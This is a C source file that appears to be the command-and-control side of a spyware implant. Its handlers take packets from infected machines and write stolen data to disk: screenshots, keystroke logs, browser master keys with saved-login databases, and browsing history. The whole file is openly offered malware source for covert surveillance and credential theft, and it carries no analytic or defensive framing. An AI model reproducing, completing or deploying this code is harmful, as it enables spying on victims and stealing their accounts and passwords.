#include "spyware_controller.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

/* Create the per-implant save directory if it does not already exist. */
void ensure_save_dir(const char *save_dir)
{
    if (mkdir(save_dir, 0755) != 0 && errno != EEXIST)
        fprintf(stderr, "[exfil] could not create %s\n", save_dir);
}

void handle_screenshot_response(Packet *resp, const char *save_dir)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE) return;

    char filename[512];
    snprintf(filename, sizeof(filename), "%s/screenshot_%ld.bmp", save_dir, time(NULL));
    FILE *fp = fopen(filename, "wb");
    if (fp) {
        fwrite(resp->payload, 1, resp->payload_len, fp);
        fclose(fp);
        printf("<Screenshot saved to %s (%d bytes)>\n\n", filename, resp->payload_len);
    } else {
        printf("<Failed to open %s for writing>\n\n", filename);
    }
}

void handle_keylog_dump_response(Packet *resp, const char *save_dir)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE) return;

    char filename[512];
    snprintf(filename, sizeof(filename), "%s/keylog_%ld.txt", save_dir, time(NULL));
    FILE *fp = fopen(filename, "w");
    if (fp) {
        fwrite(resp->payload, 1, resp->payload_len, fp);
        fclose(fp);
        printf("<Keylog saved to %s (%d bytes)>\n\n", filename, resp->payload_len);
    } else {
        printf("<Failed to open %s for writing>\n\n", filename);
    }
}

void handle_cred_steal_response(Packet *resp, const char *save_dir)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE || resp->payload_len < 4) return;

    int num_browsers = *(int *)resp->payload;
    char *p = resp->payload + 4;
    int remaining = resp->payload_len - 4;

    if (num_browsers == 0) {
        printf("<No browser credentials found on target.>\n\n");
        return;
    }

    long ts = time(NULL);
    for (int i = 0; i < num_browsers; i++) {
        if (remaining < 12) break;

        int name_len = *(int *)p; p += 4; remaining -= 4;
        char name[64];
        if (name_len >= 64) name_len = 63;
        memcpy(name, p, name_len); name[name_len] = '\0';
        p += name_len; remaining -= name_len;

        int key_len = *(int *)p; p += 4; remaining -= 4;
        char *key = p;
        p += key_len; remaining -= key_len;

        int db_len = *(int *)p; p += 4; remaining -= 4;
        char *db = p;
        p += db_len; remaining -= db_len;

        char key_file[512], db_file[512];
        snprintf(key_file, sizeof(key_file), "%s/%s_master_%ld.key", save_dir, name, ts);
        snprintf(db_file,  sizeof(db_file),  "%s/%s_LoginData_%ld.db",  save_dir, name, ts);

        FILE *fk = fopen(key_file, "wb");
        if (fk) {
            fwrite(key, 1, key_len, fk);
            fclose(fk);
            printf("<[%s] Master Key saved to %s>\n", name, key_file);
        }

        FILE *fd = fopen(db_file, "wb");
        if (fd) {
            fwrite(db, 1, db_len, fd);
            fclose(fd);
            printf("<[%s] Login Data database saved to %s>\n", name, db_file);
        }
    }
    printf("\n");
}

void handle_history_steal_response(Packet *resp, const char *save_dir)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE || resp->payload_len < 4) return;

    int num_browsers = *(int *)resp->payload;
    char *p = resp->payload + 4;
    int remaining = resp->payload_len - 4;

    if (num_browsers == 0) {
        printf("<No browser history found on target.>\n\n");
        return;
    }

    long ts = time(NULL);
    for (int i = 0; i < num_browsers; i++) {
        if (remaining < 8) break;

        int name_len = *(int *)p; p += 4; remaining -= 4;
        char name[64];
        if (name_len >= 64) name_len = 63;
        memcpy(name, p, name_len); name[name_len] = '\0';
        p += name_len; remaining -= name_len;

        int db_len = *(int *)p; p += 4; remaining -= 4;
        char *db = p;
        p += db_len; remaining -= db_len;

        char db_file[512];
        snprintf(db_file,  sizeof(db_file),  "%s/%s_History_%ld.db",  save_dir, name, ts);

        FILE *fd = fopen(db_file, "wb");
        if (fd) {
            fwrite(db, 1, db_len, fd);
            fclose(fd);
            printf("<[%s] History database saved to %s>\n", name, db_file);
        }
    }
    printf("\n");
}
